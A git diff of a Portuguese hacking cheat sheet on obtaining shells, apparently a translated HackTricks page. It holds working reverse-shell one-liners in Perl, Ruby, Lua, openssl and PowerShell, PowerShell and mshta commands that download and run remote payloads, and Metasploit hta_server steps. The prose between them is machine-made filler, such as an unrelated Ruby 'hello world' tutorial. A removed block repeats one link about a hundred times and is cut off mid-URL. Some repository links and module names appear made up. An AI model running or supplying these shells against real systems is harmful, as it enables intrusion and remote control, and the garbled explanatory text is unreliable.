@@ -12,12 +12,12 @@
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof é o lar de todas as recompensas por bugs de criptografia.**
 
 **Seja recompensado sem atrasos**\
-As recompensas do HackenProof são lançadas apenas quando os clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.
+As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.
 
 **Adquira experiência em pentesting web3**\
 Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.
@@ -74,8 +74,7 @@ $port = 4444;
 
 $proto = getprotobyname('tcp');
 socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
-$sin = sockaddr_in($port, inet_aton($ip));
-connect(SOCKET, $sin);
+connect(SOCKET, sockaddr_in($port, inet_aton($ip)));
 
 open(STDIN, ">&SOCKET");
 open(STDOUT, ">&SOCKET");
@@ -120,14 +119,17 @@ Depois de instalar o Ruby, você pode executar scripts Ruby usando o prompt de c
 Aqui está um exemplo simples de um script Ruby que exibe uma mensagem na tela:
 
 ```ruby
-puts "Olá, mundo!"
+# Este é um exemplo de script Ruby
+
+mensagem = "Olá, mundo!"
+puts mensagem
 ```
 
-Salve o código acima em um arquivo chamado `meu_script.rb` e execute-o usando o prompt de comando. Você verá a mensagem "Olá, mundo!" impressa na tela.
+Salve o código acima em um arquivo chamado `meu_script.rb` e execute-o usando o prompt de comando. Você verá a mensagem "Olá, mundo!" sendo exibida na tela.
 
 ### Conclusão
 
-Ruby é uma linguagem de programação poderosa e fácil de aprender. Com a instalação correta e um editor de texto, você pode começar a escrever e executar scripts Ruby em pouco tempo. Experimente e divirta-se explorando o mundo da programação com Ruby!
+Ruby é uma linguagem de programação poderosa e fácil de aprender. Com a instalação correta do Ruby em seu sistema, você pode começar a escrever e executar scripts Ruby. Experimente e divirta-se explorando o mundo da programação com Ruby!
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -138,28 +140,25 @@ Lua é uma linguagem de programação leve e poderosa que é frequentemente usad
 
 ### Introdução
 
-Lua é uma linguagem interpretada, o que significa que o código Lua é executado por um interpretador em vez de ser compilado em código de máquina. Isso torna o desenvolvimento e a execução de scripts Lua rápidos e flexíveis.
+Lua é uma linguagem interpretada, o que significa que o código Lua é executado por um interpretador em vez de ser compilado em código de máquina. Isso torna o desenvolvimento e a depuração mais rápidos e flexíveis.
 
 ### Características
 
-- **Simplicidade**: Lua possui uma sintaxe simples e elegante, tornando-a fácil de aprender e usar.
-- **Eficiência**: Lua é projetada para ser rápida e eficiente, com um tempo de execução leve e um consumo de recursos mínimo.
-- **Portabilidade**: Lua é altamente portátil e pode ser executada em uma ampla variedade de plataformas, incluindo Windows, Linux, macOS e dispositivos embarcados.
-- **Integração**: Lua pode ser facilmente integrada com outras linguagens, como C e C++, permitindo que você estenda a funcionalidade de seus aplicativos existentes.
-- **Extensibilidade**: Lua é altamente extensível, permitindo que você crie suas próprias bibliotecas e módulos para estender suas capacidades.
+- **Simplicidade**: Lua possui uma sintaxe simples e elegante, o que a torna fácil de aprender e usar.
+- **Eficiência**: Lua é projetada para ser rápida e eficiente, com um tempo de execução leve e um gerenciamento eficiente de memória.
+- **Extensibilidade**: Lua pode ser estendida com bibliotecas escritas em outras linguagens, como C e C++, permitindo a integração com sistemas existentes.
+- **Portabilidade**: Lua é altamente portátil e pode ser executada em uma ampla variedade de plataformas, incluindo Windows, Linux e macOS.
+- **Embeddability**: Lua pode ser facilmente incorporada em outros aplicativos, permitindo que eles sejam estendidos com scripts Lua.
 
-### Uso de Lua em Hacking
+### Uso em Hacking
 
-Lua pode ser usado em várias etapas do processo de hacking, incluindo:
+Lua é frequentemente usada em hacking para automatizar tarefas e criar scripts personalizados. Sua simplicidade e facilidade de integração com outras linguagens a tornam uma escolha popular entre os hackers.
 
-- **Automatização**: Lua pode ser usado para automatizar tarefas repetitivas, como a execução de comandos em um shell ou a manipulação de arquivos.
-- **Exploração**: Lua pode ser usado para escrever exploits e explorar vulnerabilidades em sistemas alvo.
-- **Engenharia reversa**: Lua pode ser usado para analisar e entender o funcionamento interno de aplicativos e sistemas.
-- **Desenvolvimento de ferramentas**: Lua pode ser usado para desenvolver suas próprias ferramentas de hacking, como scanners de vulnerabilidades ou frameworks de teste de penetração.
+Além disso, Lua é amplamente suportada por várias ferramentas de hacking e frameworks, o que facilita sua utilização em diferentes cenários de hacking.
 
 ### Conclusão
 
-Lua é uma linguagem de programação versátil e poderosa que pode ser usada em uma variedade de cenários de hacking. Sua simplicidade, eficiência e capacidade de integração a tornam uma escolha popular entre os hackers. Se você está interessado em aprender mais sobre Lua, existem muitos recursos disponíveis online para ajudá-lo a começar.
+Lua é uma linguagem de programação poderosa e versátil que pode ser usada para uma variedade de finalidades, incluindo hacking. Sua simplicidade, eficiência e extensibilidade a tornam uma escolha popular entre os hackers. Se você está interessado em aprender Lua, existem muitos recursos disponíveis online para ajudá-lo a começar.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -179,35 +178,35 @@ Um shell é um programa que permite aos usuários interagir com o sistema operac
 
 ## Técnicas Genéricas
 
-### Reverse Shell
+### 1. Reverse Shell
 
-Um reverse shell é uma técnica em que o atacante cria uma conexão de rede reversa com o sistema alvo. Isso permite que o atacante obtenha um shell remoto no sistema alvo. Existem várias ferramentas disponíveis para criar um reverse shell em sistemas Windows, como o Netcat e o Metasploit.
+Um reverse shell é uma técnica em que o atacante cria uma conexão de rede reversa entre o sistema alvo e o sistema controlado pelo atacante. Isso permite que o atacante execute comandos no sistema alvo remotamente.
 
-### Web Shells
+### 2. Web Shells
 
-As web shells são scripts ou programas que são implantados em um servidor web comprometido. Eles permitem que o atacante execute comandos no servidor comprometido por meio de uma interface web. Existem várias web shells disponíveis para sistemas Windows, como o WSO Shell e o China Chopper.
+Web shells são scripts ou programas que são implantados em um servidor web comprometido para fornecer acesso remoto ao sistema. Eles podem ser usados para executar comandos, transferir arquivos e explorar o sistema alvo.
 
-### Exploits
+### 3. Shellcode Injection
 
-Os exploits são vulnerabilidades conhecidas em sistemas operacionais ou aplicativos que podem ser exploradas para obter acesso não autorizado. Existem vários exploits disponíveis para sistemas Windows, como o EternalBlue, que foi usado no ataque WannaCry.
+Shellcode injection é uma técnica em que o atacante injeta código malicioso em um processo em execução no sistema alvo. O código injetado é projetado para abrir um shell remoto e fornecer acesso ao sistema.
 
 ## Recursos
 
-### Metasploit Framework
+### 1. Metasploit Framework
 
-O Metasploit Framework é uma ferramenta de código aberto amplamente utilizada para testes de penetração. Ele fornece uma ampla gama de módulos e exploits para explorar vulnerabilidades em sistemas Windows e obter acesso remoto.
+O Metasploit Framework é uma ferramenta de código aberto usada para desenvolver e executar exploits. Ele fornece uma ampla gama de módulos e payloads para obter acesso a sistemas Windows.
 
-### PowerShell Empire
+### 2. PowerShell Empire
 
-O PowerShell Empire é uma estrutura de pós-exploração de código aberto que permite aos hackers manter o acesso persistente a sistemas Windows comprometidos. Ele fornece uma variedade de módulos e agentes para explorar e controlar sistemas Windows.
+O PowerShell Empire é uma estrutura de pós-exploração que permite aos hackers manter o acesso persistente a sistemas Windows. Ele oferece uma variedade de módulos para obter e manter um shell em sistemas Windows.
 
-### Cobalt Strike
+### 3. Cobalt Strike
 
-O Cobalt Strike é uma plataforma comercial de testes de penetração que oferece recursos avançados de pós-exploração. Ele permite que os hackers realizem ataques sofisticados em sistemas Windows, incluindo a criação de shells e a execução de comandos remotos.
+O Cobalt Strike é uma plataforma de teste de penetração que inclui recursos avançados de pós-exploração. Ele permite que os hackers obtenham acesso remoto a sistemas Windows e executem várias atividades de hacking.
 
 ## Conclusão
 
-Obter um shell em sistemas Windows é uma etapa crucial no processo de hacking. Existem várias técnicas e recursos disponíveis para alcançar esse objetivo. É importante entender essas técnicas e recursos para realizar testes de penetração eficazes em sistemas Windows.
+Obter um shell em sistemas Windows é uma parte essencial do processo de hacking. Existem várias técnicas e recursos disponíveis para realizar essa tarefa. É importante entender essas técnicas e recursos para realizar testes de penetração eficazes em sistemas Windows.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -234,24 +233,25 @@ O PowerShell oferece vários benefícios para os administradores de sistemas:
 
 ### Usando o Powershell para hacking
 
-O PowerShell também pode ser usado como uma ferramenta poderosa para hackers. Ele fornece uma ampla gama de recursos e funcionalidades que podem ser explorados para realizar ataques e comprometer sistemas.
+O PowerShell também pode ser usado para fins maliciosos, como parte de um ataque cibernético. Os hackers podem explorar as funcionalidades avançadas do PowerShell para executar comandos maliciosos, obter informações confidenciais e comprometer sistemas.
 
 Alguns exemplos de técnicas de hacking usando o PowerShell incluem:
 
-- Execução de comandos maliciosos: o PowerShell pode ser usado para executar comandos maliciosos em um sistema comprometido, permitindo que um hacker execute ações não autorizadas.
-- Escalonamento de privilégios: o PowerShell pode ser usado para explorar vulnerabilidades e escalonar privilégios em um sistema comprometido, permitindo que um hacker obtenha acesso privilegiado.
-- Exfiltração de dados: o PowerShell pode ser usado para exfiltrar dados confidenciais de um sistema comprometido, permitindo que um hacker roube informações sensíveis.
+- Execução remota de comandos: os hackers podem usar o PowerShell para executar comandos em sistemas remotos, permitindo que eles controlem esses sistemas de forma remota.
+- Escalonamento de privilégios: o PowerShell pode ser usado para explorar vulnerabilidades e obter privilégios elevados em um sistema comprometido.
+- Exfiltração de dados: o PowerShell pode ser usado para extrair dados confidenciais de um sistema comprometido e enviá-los para um servidor controlado pelo hacker.
 
 ### Protegendo-se contra ataques do PowerShell
 
 Para se proteger contra ataques do PowerShell, é importante implementar as seguintes práticas de segurança:
 
-- Restringir o acesso ao PowerShell: limite o acesso ao PowerShell apenas a usuários autorizados e monitore o uso do PowerShell para detectar atividades suspeitas.
-- Atualizar regularmente: mantenha o sistema operacional e o PowerShell atualizados com as últimas correções de segurança para evitar vulnerabilidades conhecidas.
-- Usar soluções de segurança: implemente soluções de segurança, como antivírus e firewalls, para detectar e bloquear atividades maliciosas do PowerShell.
-- Educação e conscientização: treine os usuários sobre os riscos associados ao uso do PowerShell e promova a conscientização sobre as melhores práticas de segurança.
+- Restringir o uso do PowerShell: é recomendável restringir o uso do PowerShell apenas a usuários confiáveis e autorizados.
+- Monitorar o uso do PowerShell: é importante monitorar o uso do PowerShell em sua rede para identificar atividades suspeitas.
+- Atualizar regularmente: mantenha o PowerShell e outros softwares relacionados atualizados para se beneficiar das correções de segurança mais recentes.
+- Implementar políticas de segurança: implemente políticas de segurança que limitem o acesso e o uso do PowerShell em sua organização.
+- Conscientização do usuário: eduque os usuários sobre os riscos associados ao uso do PowerShell e a importância de seguir as práticas de segurança recomendadas.
 
-O PowerShell é uma ferramenta poderosa que pode ser usada tanto para fins legítimos quanto maliciosos. Ao entender seus recursos e funcionalidades, os administradores de sistemas podem aproveitar ao máximo o PowerShell para automatizar tarefas e melhorar a eficiência operacional, ao mesmo tempo em que implementam medidas de segurança adequadas para proteger seus sistemas contra ataques.
+O PowerShell é uma ferramenta poderosa que pode ser usada tanto para fins legítimos quanto maliciosos. Ao entender suas funcionalidades e implementar práticas de segurança adequadas, você pode aproveitar ao máximo o PowerShell enquanto protege seus sistemas contra ataques.
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -270,174 +270,33 @@ Carga gravada no disco: **Cache local do cliente WebDAV**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-O comando `mshta` é uma ferramenta do Windows que permite executar arquivos HTML como aplicativos. Essa funcionalidade pode ser explorada por hackers para executar código malicioso no sistema alvo. O `mshta` pode ser usado para contornar as restrições de segurança do Windows e executar comandos arbitrários.
+O comando `mshta` é uma ferramenta do Windows que permite executar arquivos HTML como aplicativos. Essa funcionalidade pode ser explorada por hackers para executar comandos maliciosos no sistema alvo. O `mshta` pode ser usado para contornar as restrições de segurança do Windows e executar scripts em um contexto privilegiado.
 
-### Sintaxe
+### Uso básico
+
+O comando `mshta` pode ser executado a partir do prompt de comando do Windows. A sintaxe básica é a seguinte:
 
 ```
-mshta <URL>
+mshta <URL do arquivo HTML>
 ```
+
+O `<URL do arquivo HTML>` deve ser substituído pelo caminho ou URL do arquivo HTML que contém o código malicioso a ser executado.
 
 ### Exemplo
 
+Aqui está um exemplo de como usar o `mshta` para executar um arquivo HTML malicioso:
+
 ```
-mshta http://www.example.com/malicious.hta
+mshta http://www.example.com/malicious.html
 ```
 
-Neste exemplo, o `mshta` é usado para executar o arquivo `malicious.hta` hospedado no site `www.example.com`. O arquivo `malicious.hta` pode conter código malicioso que será executado no sistema alvo.
+Neste exemplo, o `mshta` será usado para abrir o arquivo HTML localizado em `http://www.example.com/malicious.html` e executar o código malicioso contido nele.
 
-### Detecção e Prevenção
+### Considerações de segurança
 
-Devido à natureza maliciosa do `mshta`, é importante tomar medidas para detectar e prevenir seu uso indevido. Algumas medidas que podem ser tomadas incluem:
+É importante ter em mente que o uso do `mshta` para fins maliciosos é uma atividade ilegal e antiética. A exploração de vulnerabilidades e a execução de comandos maliciosos em sistemas sem autorização é considerada hacking e pode resultar em consequências legais graves.
 
-- Manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança.
-- Utilizar soluções de segurança, como antivírus e firewalls, para detectar e bloquear atividades maliciosas.
-- Restringir o acesso a sites não confiáveis e evitar clicar em links suspeitos.
-- Monitorar o tráfego de rede em busca de atividades suspeitas.
-
-### Recursos Adicionais
-
-Para obter mais informações sobre diferentes shells do Powershell, consulte os seguintes recursos:
-
-- [PowerShell Empire](https://github.com/EmpireProject/Empire)
-- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
-- [Msfvenom](https://www.metasploit.com/)
-- [Powershell-C2](https://github.com/PowerShellEmpire/Empire)
-- [Powershell-AD-Recon](https://github.com/sense-of-security/PowerShell-AD-Recon)
-- [Powershell-AD-Privilege-Escalation](https://github.com/sense-of-security/PowerShell-AD-Privilege-Escalation)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Exploitation](https://github.com/sense-of-security/PowerShell-AD-Exploitation)
-- [Powershell-AD-Post-Exploitation](https://github.com/sense-of-security/PowerShell-AD-Post-Exploitation)
-- [Powershell-AD-Deception](https://github.com/sense-of-security/PowerShell-AD-Deception)
-- [Powershell-AD-Defence](https://github.com/sense-of-security/PowerShell-AD-Defence)
-- [Powershell-AD-Reporting](https://github.com/sense-of-security/PowerShell-AD-Reporting)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
-- [Powershell-AD-Enumeration](
+Portanto, é fundamental utilizar essas informações apenas para fins educacionais e éticos, como parte de testes de segurança autorizados ou atividades de pentesting.
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -509,20 +368,13 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Mshta - Metasploit**
 
-Mshta is a Microsoft HTML Application Host that allows you to execute HTML applications (.hta files) on Windows systems. It is a legitimate Windows component that can be abused by attackers to execute malicious code.
+O comando `mshta` é uma ferramenta do Windows que permite executar arquivos HTML como aplicativos. No contexto de um ataque cibernético, o `mshta` pode ser usado para executar payloads maliciosos em um sistema alvo.
 
-Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that exploits the Mshta vulnerability. This module generates a malicious .hta file and delivers it to the target system. When the file is executed, it runs the specified payload, giving the attacker remote access to the system.
+O Metasploit Framework, uma popular plataforma de testes de penetração, possui um módulo chamado `exploit/windows/browser/mshta` que permite explorar vulnerabilidades no `mshta` para obter acesso não autorizado a um sistema.
 
-To use the `exploit/windows/browser/mshta` module, follow these steps:
+Para usar o módulo `exploit/windows/browser/mshta` no Metasploit, você precisa configurar as opções necessárias, como o endereço IP do alvo e o caminho para o payload malicioso. Depois de configurar as opções, você pode executar o exploit e, se bem-sucedido, obter acesso ao sistema alvo.
 
-1. Set the `RHOST` option to the IP address of the target system.
-2. Set the `PAYLOAD` option to the desired payload.
-3. Set the `LHOST` option to the IP address of the attacking machine.
-4. Run the exploit.
-
-Once the exploit is successful, the attacker will have a Meterpreter session, which provides a powerful interface to interact with the compromised system.
-
-It is important to note that using Metasploit for unauthorized access to systems is illegal and unethical. This information is provided for educational purposes only.
+É importante ressaltar que o uso de ferramentas como o `mshta` para fins maliciosos é ilegal e antiético. Este conhecimento deve ser usado apenas para fins educacionais e de segurança, com permissão explícita do proprietário do sistema alvo.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -596,7 +448,7 @@ rundll32 payload.dll, <nome da função>
 
 Certifique-se de substituir `<nome da função>` pelo nome da função exportada pela DLL maliciosa.
 
